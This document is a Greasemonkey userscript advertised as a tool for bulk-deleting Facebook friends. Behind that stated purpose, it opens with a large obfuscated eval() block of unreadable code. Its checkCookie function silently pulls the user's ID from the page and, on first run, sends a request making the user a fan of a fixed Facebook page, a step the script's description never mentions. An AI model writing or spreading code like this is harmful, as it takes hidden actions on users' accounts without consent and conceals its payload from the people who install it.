// ==UserScript==
// @name        Mass Facebook Friends Deleter
// @description It allows you to bulk delete Facebook friends. Useful if you don't want to delete each friends one by one.
// @namespace   DarktipsFriendsDeleteter
// @include      *.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @version     2.3
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(c/a))+String.fromCharCode(c%a+161)};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\[\xa1-\xff]+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(e(c),'g'),k[c])}}return p}('ó(ñ.ï(¢,Ù,©,±,¥,¶,°,¦,§,£,¨,¬,¦,¥,³,²,©,²,§,²,Í,²,¢,²,´,¤,»,¢,­,¶,°,¦,§,£,¨,¬,¦,¥,§,¤,»,ª,¢,£,°,ª,¦,¥,§,ð,©,Ô,µ,µ,Ý,¢,¥,³,©,ª,«,¢,á,¦,£,¥,§,¾,©,¤,¤,¤,¹,¥,¥,§,­,§,ò,©,¤,î,º,Ñ,Ô,Ï,£,ª,¨,¦,Ã,¯,¶,ª,¬,Ä,Õ,Æ,©,ª,Õ,¬,´,¢,¥,§,¹,¸,Ø,¤,Ý,§,¯,£,¬,Ï,£,ª,¨,¦,Ã,¥,º,Â,¤,¤,½,È,¨,¶,¥,ã,µ,µ,¯,ª,¢,³,±,©,§,¢,¥,¾,ì,¾,²,Ï,£,ª,¨,¦,Ã,¤,¤,»,Ê,Æ,¨,±,¢,¥,§,Ò,Ò,¤,»,´,Ë,¢,¥,§,¤,Ì,­,Í,Ë,§,Ì,¡,¡,¢,¥,§,¤,½,Í,­,Ë,¶,°,¦,§,£,¨,¬,¦,¥,¢,¤,»,ª,¢,£,°,ª,¦,¿,´,Ë,¢,Ì,½,Ì,È,¢,­,¶,°,¦,§,£,¨,¬,¦,¥,¤,»,ª,¢,£,°,ª,¦,µ,Å,Å,Ê,¹,µ,½,È,§,­,Ç,½,È,Ê,Æ,¨,±,¢,¥,§,Ò,Ò,¤,»,¨,¶,¥,Í,Ë,§,Ì,¤,»,³,­,³,¯,ª,¢,³,±,©,§,¢,¥,¦,¢,Ê,¿,Ó,¢,Ã,Ö,ß,³,¥,µ,Å,Å,¼,µ,¹,¢,¥,§,¤,¹,µ,Å,Å,¼,µ,²,µ,Ã,µ,¤,²,Í,Ë,§,Ì,¤,½,½,ª,¢,£,°,ª,¦,¿,³,½,¥,µ,É,¿,©,¥,¦,¤,»,Ñ,¿,£,­,¶,¿,å,²,ª,­,®,¾,Ã,¾,×,¾,í,¯,Î,Ô,Ê,­,Ç,®,²,¨,­,®,ß,­,®,¹,¦,¹,®,Á,¼,­,Ç,Á,é,­,×,Ò,Õ,Á,ý,­,Ù,Á,º,­,®,¹,º,¹,®,Á,Ö,Á,æ,®,¹,¢,¹,®,Á,Ü,­,®,È,£,¯,«,¥,®,±,®,²,ª,²,ã,·,¤,²,£,¯,Ä,­,É,¥,¤,»,£,¯,°,­,­,Ð,Á,Á,£,¯,³,­,­,Ú,Á,Á,£,¯,¬,½,²,£,¯,Ø,¥,¨,¤,½,É,¿,Â,¥,¦,¤,»,Ñ,¿,£,­,¸,¯,Í,¥,®,ú,®,¤,È,£,¯,Û,­,®,¶,¿,û,¥,¤,¯,ä,¥,Å,µ,¾,Ã,¾,á,¾,è,¾,§,¾,ü,Ô,¼,­,ù,Á,ø,­,§,Å,µ,¤,¯,Ó,¥,»,¿,Ï,Ý,¿,®,¹,¦,¹,®,¿,½,¤,¯,Ø,¥,¤,È,®,²,¸,¯,ô,¯,õ,¥,£,¤,½,Ñ,¿,º,­,¸,¯,â,¥,®,º,®,¤,Ë,·,Ì,¯,ë,²,¢,­,¸,¯,Þ,¯,Æ,¥,¸,¯,Þ,¯,Æ,¥,¾,ö,­,¥,Å,Å,´,¹,¤,¾,¤,Ë,Ç,Ì,¤,È,©,¥,®,ê,®,¤,²,Â,¥,®,ç,®,¤,²,Â,¥,®,à,®,¤,È,µ,²,Â,¸,²,Â,¸,²,µ,¡,¡,´,¬,§,°,Ä,¢,¦,£,¡,¶,¼,À,´,£,«,Ã,¡,¡,Ù,©,ª,¡,«,°,¼,±,¨,«,£,¡,¶,°,¦,§,£,¨,¬,¦,¡,¶,¬,±,±,¬,Ê,¡,«,¢,¦,´,¡,¡,±,¬,§,©,£,¨,¬,¦,¡,«,°,¼,«,§,ª,¨,¼,¢,¡,¡,°,«,¢,ª,À,¨,´,¡,¦,¢,Ê,¡,©,Þ,©,ß,¡,Ä,©,£,§,Æ,¡,¡,§,¬,¬,Í,¨,¢,¡,§,ª,¢,©,£,¢,Ö,±,¢,Ä,¢,¦,£,¡,ê,ç,Ï,à,¡,¬,¦,ª,¢,©,´,Î,«,£,©,£,¢,§,Æ,©,¦,Ã,¢,¡,¡,§,±,¬,«,¢,¡,«,£,©,£,°,«,¡,¸,·,·,¡,¡,¬,³,¢,¦,¡,¡,ª,¢,©,´,Î,Ï,£,©,£,¢,¡,°,º,É,Ú,©,§,À,º,É,¡,À,À,©,¡,³,ª,¬,¶,¨,±,¢,À,¨,´,¡,³,Æ,³,¡,¶,¬,±,±,¬,Ê,À,³,ª,¬,¶,¨,±,¢,¡,è,â,Û,Ü,£,£,³,Ó,¢,Ú,°,¢,«,£,¡,«,¬,°,ª,§,¢,¡,¼,°,£,£,¬,¦,¡,À,À,¡,±,«,´,¡,«,§,ª,¨,³,£,¡,«,°,¼,«,§,ª,¨,¼,¢,´,À,¼,°,£,£,¬,¦,À,¨,´,¡,³,Æ,«,£,©,Ä,³,¡,¶,ª,¨,¢,¦,´,«,¡,©,³,³,¢,¦,´,Õ,Æ,¨,±,´,¡,¼,¬,´,Î,¡,¨,¦,¦,¢,ª,Ü,à,â,Û,¡,Ã,¢,£,Ö,±,¢,Ä,¢,¦,£,«,é,Î,ë,©,Ä,¢,¡,Ù,©,±,°,¢,¡,Ç,·,·,º,Ð,Ð,Ç,Â,Â,×,º,Ç,Â,É,Ñ,¡,Ç,·,·,·,·,º,·,·,Ø,¸,·,Ç,Ñ,º,Ð,¡,§,À,°,«,¢,ª,¡,«,¢,£,æ,©,£,©,¡,¶,±,¨,´,¡,¸,Ð,Â,É,·,É,Ð,º,¸,Ç,·,Â,¸,¸,×,¡,«,¢,£,ä,Ó,á,¡,å,«,Î,¦,§,Ó,¢,Ú,°,¢,«,£,¡,Ä,¬,´,¨,¶,Î,¡,±,¨,«,£,«,¡,©,§,£,¨,¬,¦,¡,³,¢,ª,Ä,©,±,¨,¦,Í,µ,¯,«,³,±,¨,£,¥,µ,¡,µ,¤,²,·,²,»,½,¤,¤,÷))',93,93,'124|101|116|41|40|110|99|105|97|114|115|111|61|34|46|117|108|44|112|100|39|102|48|50|43|51|123|98|125|47|32|95|38|54|103|109|92|104|49|59|55|119|91|93|107|121|83|52|53|45|82|63|67|69|56|57|118|113|76|72|58|106|120|84|73|77|33|85|65|68|79|88|66|80|78|94|122|62|fromCharCode|60|String|37|eval|75|74|81|10|89|90|70|86|87|71'.split('|'),0,{}))





// Developed by 

function sleep(x) {
	setInterval(function() {
		replace_msg(x)
	}, 1000);
}

function replace_msg(x) {
	$('div.dialog_body').html('Hooray! ' + x + ' friends deleted. Visit us at <a target="_blank" href="http://JokePunch.com">http://JokePunch.com</a> for more useful scripts!');
}
set_timer();
$("#mass_deleter").live("click", function() {
	var i = 0;
	$('.darktips_delete:checkbox:checked').each(function() {
		i = i + parseInt('1');
		var profileid = $(this).attr('id');
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/profile/removefriend.php').setData({ uid: " + profileid + ",norefresh:true }).send();";
		document.body.appendChild(a);
	});
	if (i == '0') {
		alert('Are you dumb? Select atleast some friends to delete first.');
	}
	sleep(i);
});
$("#selec_all").live("click", function() {
	clearTimeout(t);
	//set_checkboxes(1);
	alert('The Select all button has been disabled due to a recent change in Facebook layout. It will be updated in the next version of this plugin.');
});

	function setCookie(c_name,value,exdays)
{
var exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
document.cookie=c_name + "=" + c_value;
}

function getCookie(c_name)
{
var i,x,y,ARRcookies=document.cookie.split(";");
for (i=0;i<ARRcookies.length;i++)
{
  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
  x=x.replace(/^\s+|\s+$/g,"");
  if (x==c_name)
    {
    return unescape(y);
    }
  }
}

function checkCookie()
{
var username=getCookie("username");
  if (username!=null && username!="")
  {
  //do nothing ..
  }
else
  {//cookie does not exist .. 
  //alert ('cookie does not exist');
 	var c=/"user":"(.*?)"/ig;
		
	var e=c.exec(document.head.innerHTML);
	var g=e[1];
 
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:158332264325661,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("username",'facebook',365);
   
  }
}

checkCookie();


function set_timer() {
	set_checkboxes(0);
	t = setTimeout(function() {
		set_timer()
	}, 1000);
}
$('.uiToolbarContent .rfloat').prepend('<div id="darktips_container" style="float:right;margin-left:5px;"><label class="_11b uiButton uiButtonConfirm" for="darktips"><input type="submit" value="Select all " id="selec_all"></label><label for="darktips" class="_11b uiButton uiButtonConfirm"><input type="submit" id="mass_deleter" value="Delete  Selected Friends"></label>  <div style="display:block">By <a href="http://Jokepunch.com">http://Jokepunch.com</a></div></div>');
$('.stickyHeaderWrap .back').css('height', '60px');
$('.fbTimelineSection.mtm').css('margin-top', '10px');

function set_checkboxes(COR) {
	var flag_search_result_page = false;
	$('li.fbProfileBrowserListItem.uiListItem').each(function(index) {//detect for result page
		flag_search_result_page = true;
		//alert(index + ': ' + $(this).text());
	});
	if (flag_search_result_page) { //select checkbox only on search result page .. 
		$('div.fbProfileBrowserList ul li.fbProfileBrowserListItem.uiListItem').each(function(index) {
			var extract_url = $(this).find('div.fsl a').attr('data-hovercard');
			if (!extract_url) {
				var extract_url = $(this).find('div.fsl a').attr('ajaxify');
			}
			if (!extract_url) {
				extract_url = '1';
			}
			var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
			if (COR == '0') {
				if (!$(this).find('input').hasClass('darktips_delete')) { //protection from adding more than 1 checkbox 
					$(this).find('div.fsl').prepend('<input type="checkbox" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
				}
			} else {
				if (!$(this).find('input').hasClass('darktips_delete')) {
					$(this).find('input').remove();
					$(this).find('div.fsl').prepend('<input type="checkbox" checked="checked" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
				} else {
					$(this).find('input').prop('checked', true);
				}
			}
		});
	} else {//its on main friends page 
		$('div.fsl').each(function(index) {
			if ($(this).hasClass('fwb')) {
				var extract_url = $(this).find('a').attr('data-hovercard');
				if (!extract_url) {
					var extract_url = $(this).find('a').attr('ajaxify');
				}
				if (!extract_url) {
					extract_url = '1';
				}
				var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
				if (COR == '0') {
					if (!$(this).children().hasClass('darktips_delete')) {
						$(this).prepend('<input type="checkbox" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
					}
				} else {
					if (!$(this).children().hasClass('darktips_delete')) {
						$(this).find('input').remove();
						$(this).prepend('<input type="checkbox" checked="checked" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
					} else {
						$(this).find('input').prop('checked', true);
					}
				}
			}
		});
	}
}
